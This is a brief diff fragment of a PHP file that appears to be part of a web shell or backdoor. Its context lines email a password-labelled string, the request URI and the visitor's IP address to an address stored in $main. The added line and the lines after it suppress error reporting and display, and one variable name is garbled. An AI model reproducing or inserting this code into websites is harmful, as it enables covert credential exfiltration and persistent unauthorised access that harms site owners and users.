@@ -144,6 +144,7 @@ $now =
     $_SERVER["REQUEST_URI"];
 $notif = "$now *PW : [ " . $▛ . " ]";
 mail($main, "Ding OOng Ojime ", $notif, "[ " . $_SERVER["REMOTE_ADDR"] . " ]");
+error_reporting(0);
 ?><?php
 @ini_set('output_buffering', 0);
 @ini_set('display_errors', 0);
